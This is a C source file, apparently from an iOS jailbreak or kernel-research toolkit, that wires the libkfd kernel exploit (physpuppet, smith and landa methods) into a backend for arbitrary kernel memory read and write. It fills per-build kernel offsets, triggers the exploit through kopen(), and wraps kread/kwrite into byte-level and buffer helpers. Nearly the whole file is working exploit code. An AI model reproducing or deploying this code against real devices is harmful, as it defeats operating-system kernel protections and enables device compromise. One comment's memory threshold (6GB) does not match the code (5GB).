//
//  ke_backend_kfd.c — krw backend over libkfd (opa334 fork of Félix
//  Poulin-Bélanger's kfd, MIT), vendored under vendor/libkfd.
//
//  The vendored libkfd was modified by opa334 for Dopamine: it expects the
//  caller to fill `dynamic_system_info` with offsets before kopen(), the same
//  way Dopamine's kfd driver does. We fill it from the per-build offsets
//  table (offsets/), which is generated offline with XPF.
//
#include "ke_internal.h"

#include "libkfd.h"
#undef T1SZ_BOOT

static u64 g_kfd = 0;

static void keKfdFillDynamicInfo(const KEBuildOffsets *o)
{
    const bool isIOS15 = (keEnv.major < 16);
    const bool atLeast154 = (keEnv.major > 15 || keEnv.minor >= 4);

    uint64_t pmapToHint = 0;
    if (keEnv.major >= 16) {
        pmapToHint = 0x58;
    } else if (atLeast154) {
        pmapToHint = 0x38;
    } else {
        pmapToHint = 0xB8;
    }

    dynamic_system_info = (struct dynamic_info){
        .kread_kqueue_workloop_ctl_supported = true,
        .krkw_iosurface_supported = isIOS15,
        .perf_supported = !isIOS15,

        .kernelcache__static_base = o->staticBase,

        .proc__p_list__le_next = o->procListNext,
        .proc__p_list__le_prev = o->procListPrev,
        .proc__task = o->procTask,
        .proc__p_pid = o->procPid,
        .proc__p_fd__fd_ofiles = o->procFd + o->filedescOfilesStart,
        .proc__object_size = o->procObjectSize,

        .task__map = o->taskMap,

        .vm_map__hdr_links_prev = o->vmMapHdrLast,
        .vm_map__hdr_links_next = o->vmMapHdrFirst,
        .vm_map__min_offset = o->vmMapMinOffset,
        .vm_map__max_offset = o->vmMapMaxOffset,
        .vm_map__hdr_nentries = o->vmMapMaxOffset + 0x8,
        .vm_map__hdr_nentries_u64 = o->vmMapMaxOffset + 0x8,
        .vm_map__hdr_rb_head_store_rbh_root = o->vmMapMaxOffset + 0x18 - (atLeast154 ? 0x8 : 0x0),

        .vm_map__pmap = o->vmMapPmap,
        .vm_map__hint = o->vmMapPmap + pmapToHint,
        .vm_map__hole_hint = o->vmMapPmap + pmapToHint + 0x8,
        .vm_map__holes_list = o->vmMapPmap + pmapToHint + 0x10,
        .vm_map__object_size = o->vmMapPmap + pmapToHint + 0x28,

        .IOSurface__isa = 0x0,
        .IOSurface__pixelFormat = 0xa4,
        .IOSurface__allocSize = 0xac,
        .IOSurface__useCountPtr = 0xc0,
        .IOSurface__indexedTimestampPtr = 0x360,
        .IOSurface__readDisplacement = 0x14,

        .thread__thread_id = 0x400,

        .kernelcache__allproc = o->allproc,

        .kernelcache__cdevsw = o->kernelCdevsw,
        .kernelcache__gPhysBase = o->kernelGPhysBase,
        .kernelcache__gPhysSize = o->kernelGPhysSize,
        .kernelcache__gVirtBase = o->kernelGVirtBase,
        .kernelcache__perfmon_dev_open = o->kernelPerfmonDevOpen,
        .kernelcache__perfmon_devices = o->kernelPerfmonDevices,
        .kernelcache__ptov_table = o->kernelPtovTable,
        .kernelcache__vn_kqfilter = o->kernelVnKqfilter,

        .device__T1SZ_BOOT = o->t1szBoot,
        .device__ARM_TT_L1_INDEX_MASK = o->armTTL1IndexMask,
    };
}

static bool keKfdOffsetsSufficient(const KEBuildOffsets *o)
{
    if (!o) return false;
    if (!o->allproc || !o->staticBase) return false;
    if (!o->procListNext || !o->procPid || !o->procTask || !o->taskMap) return false;
    if (!o->vmMapPmap || !o->vmMapMaxOffset || !o->vmMapHdrFirst || !o->vmMapHdrLast) return false;
    if (!o->t1szBoot || !o->armTTL1IndexMask) return false;
    if (keEnv.major >= 16) {
        // sem_open + perf path needs the physrw/perfkrw symbols
        if (!o->kernelCdevsw || !o->kernelGVirtBase || !o->kernelGPhysBase || !o->kernelPtovTable
            || !o->kernelPerfmonDevOpen || !o->kernelPerfmonDevices || !o->kernelVnKqfilter
            || !o->filedescOfilesStart || !o->procObjectSize) {
            return false;
        }
    }
    return true;
}

static uint32_t keKfdAutoPuafPages(void)
{
    // Simplified from Dopamine's kfd driver: 512 default, 3072 on >= 6GB devices
    uint64_t memsize = 0;
    size_t size = sizeof(memsize);
    if (sysctlbyname("hw.memsize", &memsize, &size, NULL, 0) == 0 && memsize >= (5ULL << 30)) {
        return 3072;
    }
    return 512;
}

int keKfdInit(KEBackendID backend, const KEConfig *config)
{
    u64 puafMethod;
    switch (backend) {
        case KE_BACKEND_KFD_PHYSPUPPET: puafMethod = puaf_physpuppet; break;
        case KE_BACKEND_KFD_SMITH:      puafMethod = puaf_smith;      break;
        case KE_BACKEND_KFD_LANDA:      puafMethod = puaf_landa;      break;
        default: return KE_ERR_INVALID_ARGUMENT;
    }

    const KEBuildOffsets *o = keOffsetsForCurrentBuild();
    if (!keKfdOffsetsSufficient(o)) {
        return KE_ERR_OFFSETS_MISSING;
    }
    keKfdFillDynamicInfo(o);

    u64 kreadMethod, kwriteMethod;
    if (keEnv.major >= 16) {
        kreadMethod = kread_sem_open;
        kwriteMethod = kwrite_sem_open;
    } else {
        kreadMethod = kread_IOSurface;
        kwriteMethod = kwrite_IOSurface;
    }

    uint32_t puafPages = config->puafPages ? config->puafPages : keKfdAutoPuafPages();

    g_kfd = kopen(puafPages, puafMethod, kreadMethod, kwriteMethod);
    if (!g_kfd) {
        return KE_ERR_EXPLOIT_FAILED;
    }
    return KE_OK;
}

static int keKfdInitWrapper(const KEConfig *config) { return keKfdInit(KE_BACKEND_KFD_PHYSPUPPET, config); }
static int keKfdInitLanda(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_LANDA, config); }
static int keKfdInitSmith(const KEConfig *config)   { return keKfdInit(KE_BACKEND_KFD_SMITH, config); }

static void keKfdDeinit(void)
{
    if (g_kfd) {
        kclose(g_kfd);
        g_kfd = 0;
    }
}

static uint8_t rd8(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint8_t)out; }
static uint16_t rd16(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint16_t)out; }
static uint32_t rd32(uint64_t where) { uint64_t out; kread(g_kfd, where, &out, sizeof(uint64_t)); return (uint32_t)out; }

static void wr8(uint64_t where, uint8_t what) {
    u64 buf[1] = { 0 };
    ((uint8_t*)buf)[0] = what;
    ((uint8_t*)buf)[1] = rd8(where + 1);
    ((uint8_t*)buf)[2] = rd8(where + 2);
    ((uint8_t*)buf)[3] = rd8(where + 3);
    ((uint8_t*)buf)[4] = rd8(where + 4);
    ((uint8_t*)buf)[5] = rd8(where + 5);
    ((uint8_t*)buf)[6] = rd8(where + 6);
    ((uint8_t*)buf)[7] = rd8(where + 7);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr16(uint64_t where, uint16_t what) {
    u64 buf[1] = { 0 };
    ((uint16_t*)buf)[0] = what;
    ((uint16_t*)buf)[1] = rd16(where + 2);
    ((uint16_t*)buf)[2] = rd16(where + 4);
    ((uint16_t*)buf)[3] = rd16(where + 6);
    kwrite(g_kfd, buf, where, sizeof(u64));
}
static void wr32(uint64_t where, uint32_t what) {
    u64 buf[1] = { 0 };
    ((uint32_t*)buf)[0] = what;
    ((uint32_t*)buf)[1] = rd32(where + 4);
    kwrite(g_kfd, buf, where, sizeof(u64));
}

static int keKfdReadBuf(uint64_t kaddr, void *out, size_t size)
{
    if (size == 1) { *(uint8_t*)out = rd8(kaddr); return 0; }
    if (size == 2) { *(uint16_t*)out = rd16(kaddr); return 0; }
    if (size == 4) { *(uint32_t*)out = rd32(kaddr); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kread(g_kfd, kaddr + start, ((uint8_t*)out) + start, chunk);
        }
    } else {
        kread(g_kfd, kaddr, out, size);
    }
    return 0;
}

static int keKfdWriteBuf(uint64_t kaddr, const void *in, size_t size)
{
    if (size == 1) { wr8(kaddr, *(const uint8_t*)in); return 0; }
    if (size == 2) { wr16(kaddr, *(const uint16_t*)in); return 0; }
    if (size == 4) { wr32(kaddr, *(const uint32_t*)in); return 0; }
    if (size >= UINT16_MAX) {
        for (size_t start = 0; start < size; start += UINT16_MAX) {
            size_t chunk = UINT16_MAX;
            if (start + chunk > size) chunk = size - start;
            kwrite(g_kfd, (void*)((const uint8_t*)in) + start, kaddr + start, chunk);
        }
    } else {
        kwrite(g_kfd, (void*)in, kaddr, size);
    }
    return 0;
}

const KEBackendOps keBackendKfdPhyspuppet = {
    .name = "kfd/physpuppet", .id = KE_BACKEND_KFD_PHYSPUPPET,
    .init = keKfdInitWrapper, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdLanda = {
    .name = "kfd/landa", .id = KE_BACKEND_KFD_LANDA,
    .init = keKfdInitLanda, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};

const KEBackendOps keBackendKfdSmith = {
    .name = "kfd/smith", .id = KE_BACKEND_KFD_SMITH,
    .init = keKfdInitSmith, .deinit = keKfdDeinit,
    .kreadbuf = keKfdReadBuf, .kwritebuf = keKfdWriteBuf, .vtophys = NULL,
};
